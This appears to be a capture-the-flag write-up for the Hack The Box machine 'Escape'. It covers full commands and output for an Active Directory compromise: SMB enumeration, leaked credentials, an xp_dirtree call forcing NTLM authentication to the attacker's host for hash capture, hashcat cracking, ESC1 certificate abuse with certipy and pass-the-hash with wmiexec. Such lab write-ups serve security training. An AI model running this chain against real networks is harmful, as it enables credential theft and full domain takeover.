---
layout: post
title:  "Escape (HackTheBox) Writeup"
date:   2026-02-05 13:00:00 +0530
categories: [HackTheBox, Active Directory]
---


**Escape** is a Windows Active Directory machine from **Hack The Box** that focuses on identifying and abusing enterprise Active Directory misconfigurations, with a strong emphasis on Active Directory Certificate Services (AD CS).

**Hack The Box**:  [Escape](https://app.hackthebox.com/machines/Escape)

## Enumeration

Starting with the nmap scan.

```
❯ nmap -p 1-10000 -sCV -O -T4 -Pn 10.129.228.253
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 05:04 UTC

Nmap scan report for 10.129.228.253
Host is up (0.80s latency).
Not shown: 9986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-02 13:07:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-02T13:09:01+00:00; +7h58m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-02T13:08:59+00:00; +7h58m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-02T13:01:24
|_Not valid after:  2056-02-02T13:01:24
|_ssl-date: 2026-02-02T13:09:03+00:00; +7h58m04s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-02-02T13:09:01+00:00; +7h58m05s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-02T13:08:59+00:00; +7h58m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h58m03s, deviation: 0s, median: 7h58m03s
| smb2-time: 
|   date: 2026-02-02T13:08:19
|_  start_date: N/A

```

The results showed that the target is a Windows Domain Controller with most of the Active Directory services running.
The domain is identified as `sequel.htb` .

Enumerating the shares with `smbclient` and it revealed a non-default share called `public`.

```
❯ smbclient -L ////10.129.228.253//
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.228.253 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

The public share was accessible with anonymous login and found a .pdf file. So, I downloaded the file to my target machine to analyze its content.

```
❯ smbclient //10.129.228.253/Public -U ""

Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

                5184255 blocks of size 4096. 1440647 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (8.6 KiloBytes/sec) (average 8.6 KiloBytes/sec)
smb: \> exit

```

Inside the file, I discovered credentials for domain user named `PublicUser`.

```
❯ pdftotext SQL\ Server\ Procedures.pdf

❯ cat 'SQL Server Procedures.txt'
SQL Server Procedures
Since last year we've got quite few accidents with our SQL Servers (looking at you Ryan, with your instance on the DC, why should
you even put a mock instance on the DC?!). So Tom decided it was a good idea to write a basic procedure on how to access and
then test any changes to the database. Of course none of this will be done on the live server, we cloned the DC mockup to a
dedicated server.
Tom will remove the instance from the DC as soon as he comes back from his vacation.
The second reason behind this document is to work like a guide when no senior can be available for all juniors.

Accessing from Domain Joined machine
1. Use SQL Management Studio specifying "Windows" authentication which you can donwload here:
https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16
2. In the "Server Name" field, input the server name.
3. Specify "Windows Authentication" and you should be good to go.
4. Access the database and make that you need. Everything will be resynced with the Live server overnight.

Accessing from non domain joined machine
Accessing from non domain joined machines can be a little harder.
The procedure is the same as the domain joined machine but you need to spawn a command prompt and run the following
command: cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password> . Follow the other steps from
above procedure.
If any problem arises, please send a mail to Brandon


Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".

```

```
user         PublicUser 
password     GuestUserCantWrite1 
```


## Initial Foothold

Using the credentials obtained earlier, I authenticated to the Microsoft SQL Server using `mssqlclient`. The `PublicUser` account was mapped to the guest database and there was not much to work with. So, the next approach was to get the SQL server to connect back to my local machine and authenticate and the hash will be captured.

I started `responder` and the SQL Server attempts to access the remote share, it automatically tries to authenticate using NTLM as the SQL Server service account.

```
❯ mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.129.228.253
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
 
SQL (PublicUser  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
guest                public     NULL        NULL        guest           b'2         '   b'00'   
INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
sys                  public     NULL        NULL        NULL            b'4         '    NULL   

SQL (PublicUser  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   

SQL (PublicUser  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------    
SQL (PublicUser  guest@master)> EXEC xp_dirtree '\\10.10.16.124\share', 1, 1
subdirectory   depth   file   
------------   -----   ----     
SQL (PublicUser  guest@master)> exit

```

And a hash was captured for user `sql_svc`.

```
❯ sudo responder -I tun0 -v

[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:dd219af734d82fc7:2DCD73B65A2BEDE15B395A6EF3479CD5:010100000000000080E8DF300594DC01CDC5EEC0AF8AD6C300000000020008003100570050004B0001001E00570049004E002D003300390058004A003200450050004B0048004800460004003400570049004E002D003300390058004A003200450050004B004800480046002E003100570050004B002E004C004F00430041004C00030014003100570050004B002E004C004F00430041004C00050014003100570050004B002E004C004F00430041004C000700080080E8DF300594DC01060004000200000008003000300000000000000000000000003000004A7C0630DFCF20B86492FA0A66080304058F28FC3352462E4E3C3C6C81BEF9570A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100320034000000000000000000  
```

I used `hascat` to crack the hash.

```
❯ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

password:    REGGIE1234ronnie

```

With the newly obtained credentials for user `sql_svc`. I tried to get a shell on the target machine using `WinRm`  and found nothing in the home directory.
I enumerate the user and found one interesting group here called `Certificate Service DCOM Access`which can be used later for privilege escalation.

```
❯ evil-winrm -i 10.129.228.253 -u sql_svc -p 'REGGIE1234ronnie'

*Evil-WinRM* PS C:\Users> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

While enumerating further, I was able to get my hands on a backup log file called `ERRORLOG.BAK` and it revealed some interesting information. 
I was able to found credentials for user `ryan.cooper`due to the multiple failed login attempts.

```
*Evil-WinRM* PS C:\SQLServer\logs> type ERRORLOG.BAK


2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]

```

```
user :     Ryan.Cooper
password:  NuclearMosquito3
```

With `ryan.cooper`, I tried to get the shell using `WinRM` and it worked. The `user flag` was retrieved from the Desktop. 

```
❯ evil-winrm -i 10.129.228.253 -u ryan.cooper -p 'NuclearMosquito3'

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type ..\desktop\user.txt
898d00c2fba9ce9a062ed2**********

```

## Privilege Escalation

I performed user enumeration and found out that `ryan.cooper` is a part of the `Certificate Service DCOM Access` and can be abused for privilege escalation.

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== ==============================================
sequel\ryan.cooper S-1-5-21-4078382237-1492182817-2568127209-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## AD CS Enumeration

I used `certipy-ad` with the credentials for user `ryan.cooper` in order to identify vulnerable certificate templates. 

```
❯ certipy-ad find -dc-ip 10.129.228.253 -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -enabled -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

This revealed a vulnerable certificate template named `UserAuthentication` and this template was flagged as vulnerable to `ESC1`, which can be abused to impersonate privileged users in the domain.

Using `certipy-ad`, I requested a certificate as **administrator** while authenticating as **ryan.cooper**.

```
❯ certipy-ad req -u 'ryan.cooper@sequel.htb' \
-p 'NuclearMosquito3' \
-dc-ip 10.129.228.253 \
-target 'dc.sequel.htb' \
-ca 'sequel-DC-CA' -template 'UserAuthentication' \
-upn 'administrator@sequel.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

Fixing the clock skrew error.

```
sudo systemctl stop systemd-timesyncd
sudo ntpdate 10.129.228.253

```

The request was successful, and a certificate along with its private key was generated and saved locally as **`administrator.pfx`**. This certificate could now be used to authenticate as **Administrator**.

The authentication was successful and NTLM hash for the administrator was generated.

```
 certipy-ad -debug auth -pfx administrator.pfx -dc-ip 10.129.228.253

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '10.129.228.253'
[+] DC IP: '10.129.228.253'
[+] DC Host: ''
[+] Target IP: '10.129.228.253'
[+] Remote Name: '10.129.228.253'
[+] Domain: ''
[+] Username: ''
[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[+] Sending AS-REQ to KDC sequel.htb (10.129.228.253)
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[+] Attempting to write data to 'administrator.ccache'
[+] Data written to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee

```

The final step was using `wmiexec` to get the shell as Administrator on the target machine and navigating to the Administrator’s desktop revealed the `root flag`.

```
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee sequel.htb/administrator@10.129.228.253
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>cd Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
639e2dcb157481b69e4845**********

```